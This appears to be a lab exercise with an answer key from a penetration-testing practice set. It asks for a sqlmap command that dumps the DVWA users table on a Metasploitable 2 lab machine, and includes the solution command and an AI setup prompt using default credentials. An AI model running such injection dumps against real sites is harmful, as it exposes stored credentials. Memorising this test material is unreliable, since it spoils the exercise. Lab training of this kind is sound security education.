# Q067 — sqlmap Against DVWA

| Field | Value |
|---|---|
| **Target** | `192.168.52.129` (Metasploitable 2) |
| **Domain** | 12 — Web Apps / 13 — SQLi |
| **Difficulty** | 🟡 Medium |
| **Tools** | `sqlmap` |
| **Time budget** | 15–25 min |

---

## 📝 Question

Use sqlmap to dump the **users** table from DVWA SQLi (low security). Provide the sqlmap command (cookie-based).

---

## 🎯 Flag Format

```
cmd=<short>
```

Example: `cmd=sqlmap -u 'http://192.168.52.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie='security=low; PHPSESSID=...' --dump -T users`

**⚠️ Format strict hai** — lowercase, no spaces around `=`, semicolon separator where shown.

---

## 💡 Hints

<details>
<summary>Hint 1 (click)</summary>

Login first to get a session cookie.
</details>

<details>
<summary>Hint 2</summary>

Use `--batch` for default answers.
</details>

---

## ✅ Solution

<details>
<summary>Show solution</summary>

```bash
sqlmap -u 'http://192.168.52.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie='PHPSESSID=XYZ; security=low' -D dvwa -T users --dump --batch
```

Returns users table with hashed passwords.

**Answer:** `cmd=sqlmap -u URL --cookie='security=low' -T users --dump`

📖 Ref: [playbooks/sqli-playbook.md](../../playbooks/sqli-playbook.md)
</details>

---

## 🤖 Claude Setup Prompt (for Claude-on-your-PC)

```
Pre-requisites for Q067:
1. Verify Metasploitable2 (192.168.52.129) up; apache2 running.
2. curl http://192.168.52.129/dvwa/login.php returns DVWA HTML.
3. In DVWA: login admin/password → DVWA Security → Low → Submit.
4. Initialize DB if first run: /dvwa/setup.php → Create/Reset Database.
5. Capture a valid PHPSESSID (browser devtools or curl with -c cookies.txt).

Report back: "Lab ready for Q067 — DVWA reachable, security=low, fresh PHPSESSID available".
```
